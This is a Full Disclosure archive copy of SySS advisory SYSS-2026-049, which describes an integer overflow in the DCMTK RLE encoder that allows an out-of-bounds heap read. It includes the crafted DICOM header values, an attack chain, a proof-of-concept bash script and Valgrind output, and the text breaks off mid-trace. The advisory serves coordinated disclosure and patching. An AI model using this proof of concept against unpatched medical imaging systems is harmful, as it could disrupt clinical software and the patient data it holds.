---
title: [SYSS-2026-049]: DICOM Toolkit (DCMTK) - Integer Overflow or Wraparound (CWE-190)
url: https://seclists.org/fulldisclosure/2026/Aug/27
source: Full Disclosure
date: 2026-08-06
fetch_date: 2026-08-07T04:29:27.543913
---

# [SYSS-2026-049]: DICOM Toolkit (DCMTK) - Integer Overflow or Wraparound (CWE-190)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](26)
[By Date](date.html#27)
[![Next](/images/right-icon-16x16.png)](28)

[![Previous](/images/left-icon-16x16.png)](26)
[By Thread](index.html#27)
[![Next](/images/right-icon-16x16.png)](28)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2026-049]: DICOM Toolkit (DCMTK) - Integer Overflow or Wraparound (CWE-190)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Fri, 31 Jul 2026 10:01:52 +0200

---

```
Advisory ID:               SYSS-2026-049
Product:                   DCMTK (DICOM ToolKit)
Manufacturer:              OFFIS e.V. / DCMTK Community
Affected Version(s):       3.7.0
Tested Version(s):         3.7.0
Vulnerability Type:        Integer Overflow or Wraparound (CWE-190)
Risk Level:                High
Solution Status:           Fixed
Manufacturer Notification: 2026-07-02
Solution Date:             2026-07-03
Public Disclosure:         2026-07-31
CVE Reference:             Not yet assigned
Author of Advisory:        Matthias Deeg, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

DCMTK (DICOM ToolKit) is an open-source collection of libraries and
applications implementing large parts of the DICOM (Digital Imaging
and Communications in Medicine) standard (see [1]).

The Run-Length Encoded (RLE) compression codec encoder is vulnerable to
an integer overflow in the expected-size sanity check. An attacker who
can supply a crafted DICOM file with attacker-controlled image dimensions
can bypass the sanity check and cause the encoder to read beyond the
Pixel Data heap allocation.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The function DcmRLECodecEncoder::encode() in libsrc/dcrlecce.cc (lines 186,
215-216, 243, and 256-268) performs a sanity check using 32-bit arithmetic
for attacker-controlled dimensions:

  if (numberOfStripes * columns * rows * numberOfFrames > length)
      result = EC_CannotChangeRepresentation;

  const Uint32 bytesPerStripe = columns * rows;
```

 const Uint32 frameSize = columns \* rows \* samplesPerPixel \*
bytesAllocated;

```
  frameOffset = frameSize * currentFrame;
  pixelPointer = pixelData8 + frameOffset + sampleOffset +
                 bytesAllocated - byte - 1;
  for (pixel = 0; pixel < bytesPerStripe; ++pixel)
      rleEncoder->add(*pixelPointer);

The sanity check uses 32-bit arithmetic. With Rows=65535, Columns=65535,
BitsAllocated=8, SamplesPerPixel=1, and NumberOfFrames=131073, the
expected byte count wraps to 1, so a two-byte Pixel Data element passes
the check. The encoder then sets bytesPerStripe to 65535 * 65535 and
reads past the two-byte heap allocation almost immediately.

The attack chain is as follows:

  1. The attacker crafts a DICOM file with carefully chosen Rows, Columns,
     and NumberOfFrames values that make the sanity product overflow
     to a small value.

  2. The Pixel Data element is set to the small overflowed size.

  3. The sanity check passes, because the overflowed product is <= length.

  4. The encoder enters the stripe loop with the correct (large)
     bytesPerStripe value.

  5. The encoder reads beyond the Pixel Data heap allocation.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

The following PoC script demonstrates this security vulnerability:

cat > poc.sh << 'EOPOC'
#!/bin/bash
# Demonstrate the RLE encoder size-check overflow through dcmcrle
# Proof of concept exploit for SYSS-2026-049

set -u

POC_DIR="$(cd "$(dirname "$0")" && pwd)"
WORKDIR="$(mktemp -d /tmp/dcmtk-dcmcrle.XXXXXX)"
INPUT_DUMP="${WORKDIR}/poc.dump"
INPUT_DCM="${WORKDIR}/poc.dcm"
OUTPUT_DCM="${WORKDIR}/poc.rle.dcm"
LOG="${WORKDIR}/dcmcrle.valgrind.log"

cleanup()
{
    rm -rf "${WORKDIR}"
}
trap cleanup EXIT

require_tool()
{
    command -v "$1" >/dev/null 2>&1 || {
        echo "[!] Missing required tool: $1"
        exit 1
    }
}

require_tool dump2dcm
require_tool dcmdump
require_tool dcmcrle
require_tool valgrind
require_tool timeout

cp "${POC_DIR}/exploit_cli.dump" "${INPUT_DUMP}"

echo "[*] RLE encoder expected-size overflow via dcmcrle"
echo "[*] Building crafted DICOM input with dump2dcm"
dump2dcm "${INPUT_DUMP}" "${INPUT_DCM}" || exit 1

echo "[*] Crafted image parameters:"
```

dcmdump +P 0028,0008 +P 0028,0010 +P 0028,0011 +P 0028,0002 +P 0028,0100
+P 7fe0,0010 "${INPUT\_DCM}"

```
echo "[*] 32-bit sanity product: 1 * 2 * 65535 * 2147418111 == 2 (mod 2^32)"
echo "[*] Running dcmcrle under Valgrind to stop at the first invalid read"

set +e
timeout 20 valgrind --quiet --error-exitcode=99 --exit-on-first-error=yes \
    dcmcrle "${INPUT_DCM}" "${OUTPUT_DCM}" >"${LOG}" 2>&1
RC=$?
set -e

cat "${LOG}"

if [ "${RC}" -eq 99 ] &&
   grep -q "Invalid read of size 1" "${LOG}" &&
   grep -q "DcmRLECodecEncoder::encode" "${LOG}" &&
   grep -q "dcrlecce.cc:268" "${LOG}" &&
   grep -q "0 bytes after a block of size 2" "${LOG}"; then
```

 echo "[+] SUCCESS: dcmcrle reached the RLE stripe loop and read
past the 2-byte Pixel Data buffer"

```
    exit 0
fi

echo "[!] FAILED: expected Valgrind invalid-read evidence was not observed"
echo "[!] Workdir retained for inspection: ${WORKDIR}"
trap - EXIT
exit 1
EOPOC

The exploit causes the RLE encoder to segfault when reading the guard
page, confirming the out-of-bounds read.

./poc.sh
[*] RLE encoder expected-size overflow via dcmcrle
[*] Building crafted DICOM input with dump2dcm
[*] Crafted image parameters:
```

(0028,0008) IS [2147418111] # 10, 1
NumberOfFrames

```
(0028,0010) US 65535                                    #   2, 1 Rows
(0028,0011) US 2                                        #   2, 1 Columns
```

(0028,0002) US 1 # 2, 1
SamplesPerPixel
(0028,0100) US 8 # 2, 1
BitsAllocated

```
(7fe0,0010) OB 41\42                                    #   2, 1 PixelData
[*] 32-bit sanity product: 1 * 2 * 65535 * 2147418111 == 2 (mod 2^32)
[*] Running dcmcrle under Valgrind to stop at the first invalid read
==53104== Invalid read of size 1
==53104==    at 0x49CB83A: UnknownInlinedFun (dcrleenc.h:103)
```

==53104== by 0x49CB83A: DcmRLECodecEncoder::encode(unsigned short
const\*, unsigned int, DcmRepresentationParameter const\*,
DcmPixelSequence\*&, DcmCodecParameter const\*, DcmStack&, bool&) const
(dcrlecce.cc:268)
==53104== by 0x49090A8: DcmCodecList::encode(E\_TransferSyntax,
unsigned short const\*, unsigned int, E\_TransferSyntax,
DcmRepresentationParameter const\*, DcmPixelSequence\*&, DcmStack&, bool&)
(dccodec.cc:625)
==53104== by 0x49C0C6F: DcmPixelData::encode(DcmXfer const&,
DcmRepresentationParameter const\*, DcmPixelSequence\*, DcmXfer const&,
DcmRepresentationParameter const\*, DcmStack&) (dcpixel.cc:497)
==53104== by 0x49C0EFF:
DcmPixelData::chooseRepresentation(E\_TransferSyntax,
DcmRepresentationParameter const\*, DcmStack&) (dcpixel.cc:292)
==53104== by 0x491921C:
DcmDataset::chooseRepresentation(E\_TransferSyntax,
DcmRepresentationParameter const\*) (dcdatset.cc:810)

```
==53104==    by 0x40044D2: main (dcmcrle.cc:295)
==53104==  Address 0x5dbe8b2 is 0 bytes after a block of size 2 alloc'd
```

==53104== at 0x4856168: operator new[](unsigned long, std::nothrow\_t
const&) (vg\_replace\_malloc.c:850)

```
==53104==    by 0x495ACA7: DcmElement::newValueField() (dcelem.cc:708)
```

==53104== by 0x4959E7B: DcmElement::loadValue(DcmInputStream\*)
(dcelem.cc:613)
==53104== by 0x495C141: DcmElement::read(DcmInputStream&,
E\_TransferSynt...